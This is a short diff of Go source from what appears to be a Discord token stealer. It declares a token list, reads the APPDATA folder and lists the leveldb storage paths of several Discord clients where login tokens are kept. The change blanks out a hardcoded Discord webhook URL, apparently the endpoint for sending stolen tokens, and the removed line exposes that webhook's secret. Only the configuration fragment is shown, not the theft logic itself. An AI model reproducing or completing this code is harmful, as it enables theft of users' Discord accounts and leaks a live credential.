@@ -16,7 +16,7 @@ var (
 	tokens []string
 	client http.Client
 	appdata = os.Getenv("APPDATA")
-	webhook = "https://discord.com/api/webhooks/814786604521881600/0ns5olXAdjLCQLMSD3VhYpmRfQkW8TcnQ8DfQ6VVzrW9pNQM588ktlkwrjRRTvEylV7n"
+	webhook = ""
 	// took these off google lmao
 	directories = []string{"\\discord\\Local Storage\\leveldb" , "\\Lightcord\\Local Storage\\leveldb",
 						   "\\discordptb\\Local Storage\\leveldb",  "\\discordcanary\\Local Storage\\leveldb",
